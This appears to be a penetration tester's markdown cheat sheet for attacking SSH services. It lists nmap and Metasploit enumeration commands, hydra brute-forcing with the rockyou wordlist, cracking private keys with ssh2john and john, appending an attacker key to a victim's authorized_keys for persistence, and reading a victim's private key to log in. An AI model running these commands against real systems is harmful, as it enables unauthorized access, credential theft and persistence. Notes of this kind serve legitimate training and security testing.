## Enumeration 
### banner grabbing 
```bash
# nmap
nc -vn <IP> 22

# nc
nc -vv <IP> 22
```

### nmap scripts
```bash
nmap -p22 <ip> -sC # Send default nmap scripts for SSH
nmap -p22 <ip> -sV # Retrieve version
nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms 
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods
```

### metasploit modules 
```bash
use auxiliary/scanner/ssh/ssh_version
use scanner/ssh/ssh_enumusers
```

### ssh-audit
```bash 
./ssh-audit.py 10.10.10.10
```

### configuration files 
```bash
# SSH client
cat /etc/ssh/ssh_config

# SSH server
cat /etc/ssh/sshd_config
```

### bruteforcing SSH 
```bash
# hydra 
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
hydra -l username -P passwords.txt -s 2222 <target-ip> ssh -t 4
hydra -l username -P passwords.txt ssh://<target-ip>:2222 -t 4

# metasploit
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
```

### cracking SSH private keys 
```bash 
ssh2john private_key.txt > hash.txt
john --wordlist=rockyou.txt hash.txt
```

### creating SSH key pairs 
```bash
ssh-keygen
echo "ssh-rsa ...." >> /home/linuxvictim/.ssh/authorized_keys
ssh linuxvictim@linuxvictim
```

### connect with SSH credentials
```bash
# using SSH credentials
ssh username@<target-ip>
ssh username@<target-ip> -p 2222

# using private key
ssh -i id_rsa user@10.10.10.10

# host key type flag 
ssh -o HostKeyAlgorithms=+ssh-rsa user@10.0.0.1

# error: no matching key exchange method found
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@10.0.0.1

# using ssh via Active Directory
ssh domain-name\\username@domain-controller
```

### connect using existing private key
```bash
# SSH private key
cat /home/<victim-user>/.ssh/id_rsa

# change permissions
chmod 600 id_rsa

# connect using private key
ssh -i id_rsa victim@10.10.10.10
```

<br> 




